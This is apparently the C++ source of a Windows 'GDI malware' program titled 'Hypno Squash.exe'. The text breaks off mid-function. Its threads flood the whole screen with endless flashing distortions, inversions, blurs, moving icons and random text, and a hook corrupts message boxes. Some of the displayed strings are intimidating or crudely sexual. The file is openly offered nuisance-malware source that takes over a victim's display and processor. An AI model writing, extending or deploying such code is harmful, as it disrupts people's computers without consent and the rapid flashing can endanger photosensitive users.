﻿#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define sqrt8 2.8284271247461900976033774484194
#define sqrt2 1.414213562373095048801688724209
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define HypnoSquashRGB (RGB(234, 182, 227))
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
static FLOAT pfSinVals[4096];
FLOAT FastSine(_In_ FLOAT f)
{
	INT i = (INT)(f / (2.f * PI) * (FLOAT)_countof(pfSinVals));
	return pfSinVals[i % _countof(pfSinVals)];
}
VOID InitializeTan(VOID)
{
	unsigned int v0;
	unsigned int* result;
	float X;
	unsigned int i;
	for (i = 0; i <= 0xFFF; ++i)
	{
		v0 = i;
		X = (double)(int)i / 4096.0 * 3.141592 + (double)(int)i / 4096.0 * 3.141592;
		pfSinVals[v0] = tanf(X);
		result = &i;
	}
}
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(HypnoSquashRGB);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
VOID WINAPI RotatePoints(POINT* points, int count, POINT center, float angle)
{
	float cosVal = cos(angle);
	float sinVal = sin(angle);
	for (int i = 0; i < count; i++)
	{
		int translatedX = points[i].x - center.x;
		int translatedY = points[i].y - center.y;
		points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
		points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
	}
}
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

struct Point3D {
	float x, y, z;
};

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;
namespace _3D
{
	VOID RotateX(VERTEX* vtx, float angle)
	{
		vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
		vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
	}
	VOID RotateY(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
		vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
	}
	VOID RotateZ(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
		vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
	}
	void DrawEdge(HDC dc, LPCTSTR icon, int x0, int y0, int x1, int y1, int r)
	{
		int dx = abs(x1 - x0);
		int dy = -abs(y1 - y0);
		int sx = (x0 < x1) ? 1 : -1;
		int sy = (y0 < y1) ? 1 : -1;
		int error = dx + dy;
		int i = 0;
		HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
		HINSTANCE HIMAGERES = LoadLibrary(_T("imageres.dll"));
		HINSTANCE HMORICONS = LoadLibrary(_T("moricons.dll"));
		HINSTANCE HPIFMGR = LoadLibrary(_T("pifmgr.dll"));
		HICON loadicons[9] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)) };
		while (true)
		{
			if (i == 0)
			{
				DrawIconEx(dc, x0, y0, loadicons[rand() % 9], 12, 12, NULL, NULL, DI_NORMAL);
				i = 10;
			}
			else
			{
				i--;
			}
			if (x0 == x1 && y0 == y1)
			{
				break;
			}
			int e2 = 2 * error;
			if (e2 >= dy)
			{
				if (x0 == x1)
				{
					break;
				}
				error += dy;
				x0 += sx;
			}
			if (e2 <= dx)
			{
				if (y0 == y1)
				{
					break;
				}
				error += dx;
				y0 += sy;
			}
		}
	}
}
VOID WINAPI nindazhidazhidadazhi(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI drawbytebeat1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return (((t ^ t >> 2) * t >> 3));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI drawbytebeat2(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return (t + 10 + 4 * (t & t >> 13 | t >> 6));
			});
		ReleaseDC(0, hdc);
	}
}
//DWORD WINAPI screendrawhypnosquashicons(LPVOID lpParam) {
//	HDC hdc = GetDC(0);
//	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
//	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
//	int w = GetSystemMetrics(SM_CXSCREEN);
//	int h = GetSystemMetrics(SM_CYSCREEN);
//	while (true)
//	{
//		for (int x = 0; x <= w; x += 64 * wdpi / 96) {
//			for (int y = 0; y <= h; y += 64 * hdpi / 96) {
//				DrawIconEx(hdc, x, y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(107)), 64 * wdpi / 96, 64 * hdpi / 96, 0, 0, DI_NORMAL);
//			}
//		}
//	}
//}
//↑I don't want to use this func because it causes too much CPU usage btw i don't want to see it on skidded malwares ,anti any act of skidded(if you skidded, you will be **********************ed)
DWORD WINAPI tesseract(LPVOID lpvd){//credits to coder-linjian, but i used random dlls instead of shell32.dll
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	float size = (w + h) / 10;
	int cx = size;
	int cy = size;
	int xdv = 10;
	int ydv = 10;
	float angleX = 0.01;
	float angleY = 0.01;
	float angleZ = 0.01;
	int d = 60;
	VERTEX vtx[] =
	{
		{size, 0, 0},
		{size, size, 0},
		{0, size, 0},
		{0, 0, 0},
		{size, 0, size},
		{size, size, size},
		{0, size, size},
		{0, 0, size},
		{size - d,  d,      d},
		{size - d,  size - d,  d},
		{d,      size - d,  d},
		{d,      d,      d},
		{size - d,  d,      size - d},
		{size - d,  size - d,  size - d},
		{d,      size - d,  size - d},
		{d,      d,      size - d}
	};
	EDGE edges[] =
	{
		{0, 1},{1, 2},{2, 3},{3, 0},{0, 4},{1, 5},{2, 6},{3, 7},{4, 5},{5, 6},{6, 7},{7,4},{8,9},{9,10},{10,11},{11,8},{8,12},{9,13},{10,14},{11,15},{12,13},{13,14},{14,15},{15,12},{0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
	};
	LPCTSTR icons[] = { IDC_ARROW, IDC_WAIT, IDC_NO, IDC_HELP };
	int index = rand() % 4;
	int totvtx = sizeof(vtx) / sizeof(vtx[0]);
	int totedg = sizeof(edges) / sizeof(edges[0]);
	while (true)
	{
		int i;
		dc = GetDC(NULL);
		for (i = 0; i < totvtx; i++)
		{
			_3D::RotateX(&vtx[i], angleX);
			_3D::RotateY(&vtx[i], angleY);
			_3D::RotateZ(&vtx[i], angleZ);
		}
		for (i = 0; i < totedg; i++)
		{
			_3D::DrawEdge(dc, icons[index],
				vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
				vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
		}
		Sleep(40);
		cx += xdv;
		cy += ydv;
		if (cx > w - (size / 2) || cx < -(size / 2))
		{
			xdv *= -1;
			index = rand() % 4;
		}
		if (cy > h - (size / 2) || cy < -(size / 2))
		{
			ydv *= -1;
			index = rand() % 4;
		}
		ReleaseDC(0, dc);
	}

	return 0;
}
DWORD WINAPI ccb(LPVOID lpParam) {
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR sb = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		sb = "CCB";
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(200, 150, 0, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Impact");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, sb, strlen(sb));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
DWORD WINAPI words(LPVOID lpParam) {
	LPCSTR texts[11] = { "Hypno Squash.exe", "Seed.1229", "LambdaTechnology Studio", "LanPiaoPiaoFlyNB", "Cai cai bei!", "get r3kτ", "What is the reason why you persist in taking this risk?.", "You are about to enter the realm of chaos", "Don't struggle, there's nothing you want", "Why does your dick and testis are so big?", "Where is your Mum and Dad?" };
	while (true) 
	{
		int rnd = rand() % 11, color = RndRGB;
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HFONT hFont = CreateFontA(rand() % 91, 0, rand() % 78, 0, FW_BOLD, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Californian FB");
		SelectObject(hdc, hFont);
		SetBkMode(hdc, 0);
		SetTextColor(hdc, color);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		DeleteDC(hdc);
		Sleep(25);
	}
}
DWORD WINAPI beziers(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true) 
	{
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		HPEN hPen = CreatePen(PS_DASHDOTDOT, rand() % 20, RndRGB);
		SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI bitblt_swir(LPVOID lpParam) {//credits to MazeIcon, but i modified it
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 10;
	while (true) 
	{
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		int i;
		for (i = 0; i < sh * 2; i++) {
			int wave = tan(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, NOTSRCCOPY);
		}
		for (i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
DWORD WINAPI stretchblt_getrectangle(LPVOID lpParam) {
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int x = rand() % 16, y = rand() % 16, x2 = rand() % 16, y2 = rand() % 16;
		DWORD ROP[12] = { SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE,MERGECOPY,MERGEPAINT,PATPAINT,PATINVERT,DSTINVERT };
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		StretchBlt(hdc, w / 16 * (rand() % 16), h / 16 * (rand() % 16), w / 16, h / 16, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 16 * (rand() % 16), h / 16 * (rand() % 16), w / 16, h / 16, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 16 * (rand() % 16), h / 16 * (rand() % 16), w / 16, h / 16, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 16 * (rand() % 16), h / 16 * (rand() % 16), w / 16, h / 16, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 16 * (rand() % 16), h / 16 * (rand() % 16), w / 16, h / 16, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		DeleteObject;
		ReleaseDC(NULL, hdc);
		Sleep(25);
	}
}
DWORD WINAPI stretchblt_mosaic(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x <= w; x += 10) {
			for (int y = 0; y <= h; y += 10) {
				StretchBlt(hcdc, x, y, 10, 10, hcdc, x, y, 1, 1, SRCPAINT);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCINVERT);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
	}
}
DWORD WINAPI anyblt1(LPVOID lpParam) {
	while (true) 
	{
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		for (int i = 0; i < h; i += 20) {
			StretchBlt(hcdc, rand() % 20, i, w, 20, hcdc, rand() % 20, i, w, 20, SRCCOPY);
		}

		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI anyblt2(LPVOID lpParam) {
	int radius = 20.5f; double angle = 0;
	while (true)
	{
		float x = cos(angle) * radius, y = sin(angle) * radius;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, x, y, SRCCOPY);
		BLENDFUNCTION blur;
		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 50;
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		angle = fmod(angle + 3.1415926 / radius, 3.1415926 * radius);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI biginvertcircle(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		const int size = 5600;
		int x = w / 2, y = h / 2;

		for (int i = 0; i < size; i += 100)
		{
			nindazhidazhidadazhi(x - i / 2, y - i / 2, i, i);
			Sleep(10);
		}
	}
	return 0;
}
DWORD WINAPI blur1(LPVOID lpvd){//credits to n17pro3426
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rect;
	POINT pt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (true) 
	{
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rect);
		int inc3 = (rand() % 700) + (GetCurrentThreadId() % 100);
		int v = (rand() % 2) + (GetCurrentThreadId() % 3);
		if (v == 1) inc3 = -inc3;
		pt[0].x = rect.left + inc3;
		pt[0].y = rect.top + inc3;
		pt[1].x = rect.right + inc3;
		pt[1].y = rect.top * inc3;
		pt[2].x = rect.left + inc3;
		pt[2].y = rect.bottom + inc3;
		PlgBlt(hdcCopy, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
DWORD WINAPI mandelbrot_like(LPVOID lpParam) {//credits to n17pro3426, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	while (true)
	{
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			double fractalX = (2.5f / w);
			double fractalY = (1.90f / h);
			double cx = x * fractalX - 2.f;
			double cy = y * fractalY - 0.95f;
			double zx = 0;
			double zy = 0;
			int fx = 0;
			while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
			{
				double fczx = zx * zx - zy * zy + cx;
				double fczy = 2 * zx * zy + cy;
				zx = fczx;
				zy = fczy;
				fx++;
				rgbScreen[i].rgb += fx;
			}
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader1(LPVOID lpParam)//credits to n17pro3426
{
	float hWnd;
	int x;
	int y;
	int i;
	HDC hdcSrc;
	HBITMAP h;
	int v7;
	int cy;
	int v9;
	int SystemMetrics;
	int v11;
	HDC hdca;
	HDC hdc;
	hdca = GetDC(0);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	v7 = 0;
	h = CreateCompatibleBitmap(hdca, SystemMetrics, cy);
	hdcSrc = CreateCompatibleDC(hdca);
	SelectObject(hdcSrc, h);
	while (true)
	{
		hdc = GetDC(0);
		v11 = GetSystemMetrics(0);
		v9 = GetSystemMetrics(1);
		for (i = 0; i <= 19; ++i)
		{
			++v7;
			BitBlt(hdcSrc, 0, 0, v11, v9, hdc, 0, 0, SRCCOPY);
			for (y = 0; y < v9; ++y)
			{
				hWnd = (double)y / 30.0 * (double)v7;
				x = (int)(FastSine(hWnd) * 50.0);
				BitBlt(hdcSrc, x, y, v11, 1, hdcSrc, 0, y, SRCCOPY);
			}
			InitializeTan();
			BitBlt(hdc, 0, 0, v11, v9, hdcSrc, 0, 0, SRCCOPY);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 90, 0 };
	PRGBTRIPLE rgbtriple; int xxx = 0, src = SRCCOPY;
	while (true)
	{
